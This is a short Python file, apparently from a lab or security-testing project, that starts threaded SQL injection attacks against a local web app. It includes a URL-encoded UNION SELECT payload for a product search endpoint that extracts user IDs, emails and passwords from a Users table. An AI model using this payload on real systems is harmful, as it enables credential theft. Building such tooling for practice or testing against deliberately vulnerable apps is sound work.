from Automated_Users.Attacks.sql_get_user_credentials import SQLInjection
import threading

class AttackManager:
    
    def __init__(self):
        print("init")
        self.sql_injection = SQLInjection(base_url="http://localhost:3000")
    
    def run_sql_injection(self, info):
        print(info)
        if info == 'try hard':
            print("right")
            attack_thread = threading.Thread(target=self.sql_injection.run_tryhard, args=([]))
        else:  
            print("false")
            self.sql_injection = SQLInjection(base_url="http://localhost:3000",sql_query="/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--")
            attack_thread = threading.Thread(target=self.sql_injection.run, args=([]))
        attack_thread.start()
         
